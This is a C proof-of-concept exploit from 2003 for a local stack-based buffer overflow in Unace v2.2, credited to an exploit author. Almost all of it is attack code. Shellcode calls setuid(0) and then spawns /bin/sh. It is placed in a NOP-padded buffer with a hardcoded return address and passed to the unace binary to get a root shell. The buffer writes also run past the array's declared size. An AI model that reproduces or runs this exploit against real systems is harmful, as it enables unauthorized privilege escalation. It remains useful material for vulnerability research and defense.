/* gEEk-unace.c
 *
 * PoC exploit made for advisory based uppon an local stack based overflow.
 * Vulnerable versions, maybe also prior versions:
 *
 * Unace v2.2
 *
 * Tested on:  Debian 3.0
 *
 * Advisory source: MegaHz
 * http://www.securityfocus.com/archive/1/344065/2003-11-07/2003-11-13/0
 *
 * -----------------------------------------
 * coded by: demz (geekz.nl) (demz@geekz.nl)
 * -----------------------------------------
 *
 */

#include <stdio.h>
#include <stdlib.h>

char shellcode[]=

        "\x31\xc0"                      // xor          eax, eax
        "\x31\xdb"                      // xor          ebx, ebx
        "\x31\xc9"                      // xor          ecx, ecx
        "\xb0\x46"                      // mov          al, 70
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\x50"                          // push         eax
        "\x68\x6e\x2f\x73\x68"          // push  long   0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // push  long   0x69622f2f
        "\x89\xe3"                      // mov          ebx, esp
        "\x50"                          // push         eax
        "\x53"                          // push         ebx
        "\x89\xe1"                      // mov          ecx, esp
        "\x99"                          // cdq
        "\xb0\x0b"                      // mov          al, 11
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\xb0\x01"                      // mov          al, 1
        "\xcd\x80";                     // int          0x80

int main()
{
        unsigned long ret = 0xbfffc260;

        char buffer[707];
        int i=0;

        memset(buffer, 0x90, sizeof(buffer));

        for (0; i < strlen(shellcode) - 1;i++)
        buffer[300 + i] = shellcode[i];

        buffer[707] = (ret & 0x000000ff);
        buffer[708] = (ret & 0x0000ff00) >> 8;
        buffer[709] = (ret & 0x00ff0000) >> 16;
        buffer[710] = (ret & 0xff000000) >> 24;
        buffer[711] = 0x0;

        printf("\nUnace v2.2 local exploit\n");
        printf("---------------------------------------- demz @ geekz.nl --\n");

        execl("./unace", "unace", "e", buffer, NULL);
}
